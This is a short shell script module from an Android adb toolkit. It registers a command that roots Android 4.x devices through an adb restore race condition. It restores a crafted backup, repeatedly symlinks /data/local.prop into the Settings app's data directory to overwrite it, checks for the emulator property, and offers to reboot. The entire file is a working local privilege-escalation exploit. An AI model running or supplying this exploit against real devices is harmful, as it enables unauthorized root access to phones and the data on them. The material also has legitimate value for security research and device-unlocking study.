# p2p-adb
# https://github.com/kosborn/p2p-adb/
# @theKos
# kyle@kyleosborn.com

# This vulnerability discovered here: 
# http://forum.xda-developers.com/showthread.php?t=1886460
# By Bin4ry 


# Registering command
registerCommand "7:adbRaceRoot:Root 4.x using adb race condition"


adbRaceRoot(){
	adb restore modules/extras/fakebackup.ab

	command "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99 2>/dev/null; do :; done; echo 'Overwrote local.prop!';" 

	if command "cat /data/local.prop" |grep ro.kernel.qemu=1 > /dev/null 
		then echo "Succesfully rooted!"
		echo "Requires a reboot..."
		echo "Would you like to reboot? (y/N)"
		read reboot
		case "$reboot" in
		 y|Y) adb reboot ;;
		 *) echo "" ;;
		esac
	fi
}
